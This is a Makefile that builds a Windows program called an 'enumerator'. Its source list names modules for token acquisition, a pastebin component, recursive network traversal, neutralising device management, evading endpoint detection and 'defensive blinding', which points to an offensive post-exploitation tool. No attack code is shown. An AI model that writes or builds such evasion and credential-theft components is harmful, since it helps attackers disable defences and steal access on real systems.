# Makefile for Windows System Enumerator
# Supports both MinGW and MSVC

CC = gcc
CFLAGS = -Wall -Wextra -std=c99 -O2
LDFLAGS = -lws2_32 -liphlpapi -ladvapi32 -lole32 -loleaut32 -lwbemuuid -lwininet -lnetapi32 -lcrypt32 -lwldap32 -lm

# Source files
SOURCES = enumerator.c \
          token_acquisition.c \
          progress.c \
          pastebin.c \
          network_recursive.c \
          mdm_detection.c \
          mdm_neutralization.c \
          edr_detection.c \
          edr_evasion.c \
          defensive_blinding.c

# Object files
OBJECTS = $(SOURCES:.c=.o)

# Target executable
TARGET = enumerator.exe

# Default target
all: $(TARGET)

# Build executable
$(TARGET): $(OBJECTS)
	$(CC) $(OBJECTS) -o $(TARGET) $(LDFLAGS)

# Compile source files
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Clean build artifacts
clean:
	rm -f $(OBJECTS) $(TARGET) *.bat

# Install (copy to system path - optional)
install: $(TARGET)
	@echo "Copy $(TARGET) to desired location manually"

.PHONY: all clean install
